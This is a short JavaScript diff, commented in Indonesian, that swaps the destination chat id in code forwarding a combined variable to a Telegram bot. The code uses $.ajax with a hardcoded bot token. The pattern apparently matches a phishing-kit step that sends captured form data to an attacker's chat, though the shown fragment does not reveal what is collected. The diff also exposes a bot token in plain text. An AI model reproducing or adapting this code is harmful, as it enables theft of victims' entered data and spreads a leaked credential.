@@ -9,7 +9,7 @@
  
 
     var token = '6934231970:AAF3edzKWVPuFxD0_mqPeEf4TXRDJ5ED9uU'; // Ganti dengan token bot yang kamu buat
-    var grup = '6364751486'; // Ganti dengan chat id dari bot yang kamu buat
+    var grup = '6541745267'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
